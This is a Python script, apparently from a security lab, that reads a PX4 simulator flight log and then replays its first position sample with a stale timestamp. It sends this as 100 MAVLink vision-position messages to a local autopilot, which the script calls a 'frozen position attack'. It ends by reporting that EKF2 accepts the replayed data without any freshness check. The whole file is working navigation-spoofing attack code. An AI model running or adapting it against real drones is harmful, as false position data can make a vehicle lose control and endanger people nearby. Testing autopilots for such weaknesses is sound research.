import socket, time
from pyulog import ULog

# Read position data directly from the log file we already captured
LOG = '/home/msc-lab/PX4-Autopilot/build/px4_sitl_default/rootfs/log/2026-05-26/13_00_45.ulg'

print("[*] Loading captured flight data from log file...")
ulog = ULog(LOG)

# Get vehicle local position data
datasets = {d.name: d for d in ulog.data_list}

if 'vehicle_visual_odometry' in datasets:
    d = datasets['vehicle_visual_odometry']
    positions = list(zip(d.data['position[0]'],
                        d.data['position[1]'],
                        d.data['position[2]'],
                        d.data['timestamp']))
    print(f"[+] Loaded {len(positions)} position samples from log")
elif 'vehicle_local_position' in datasets:
    d = datasets['vehicle_local_position']
    positions = list(zip(d.data['x'], d.data['y'], d.data['z'], d.data['timestamp']))
    print(f"[+] Loaded {len(positions)} position samples from log")
else:
    print("[!] No position data found in log")
    exit(1)

# Show what we captured
print(f"[+] Position range: x={min(p[0] for p in positions):.1f} to "
      f"{max(p[0] for p in positions):.1f}m")

print(f"\n[*] Phase 2: Replaying log data as frozen position attack...")
print(f"[*] Injecting stale position from previous session...")

from pymavlink import mavutil
injector = mavutil.mavlink_connection(
    'udp:127.0.0.1:14550',
    input=False,
    source_system=255
)

# Replay the first captured position repeatedly — this is the freeze
frozen_x, frozen_y, frozen_z, frozen_ts = positions[0]
print(f"[+] Frozen position: x={frozen_x:.2f}m y={frozen_y:.2f}m z={frozen_z:.2f}m")
print(f"[+] Stale timestamp: {frozen_ts} (from previous session)\n")

for i in range(100):
    injector.mav.vision_position_estimate_send(
        usec=int(frozen_ts),   # STALE timestamp from old session
        x=float(frozen_x),
        y=float(frozen_y),
        z=float(frozen_z),
        roll=0.0, pitch=0.0, yaw=0.0
    )
    age_s = (time.time()*1e6 - frozen_ts) / 1e6
    print(f"[+] Replayed stale position → "
          f"x={frozen_x:.2f}m y={frozen_y:.2f}m "
          f"timestamp age={age_s:.0f}s old")
    time.sleep(0.1)

print(f"\n[!] Replay attack complete")
print(f"[!] Injected position data that is {age_s:.0f} seconds stale")
print(f"[!] Finding: PX4 EKF2 has no timestamp freshness validation")
print(f"[!]          Replayed messages accepted regardless of age")
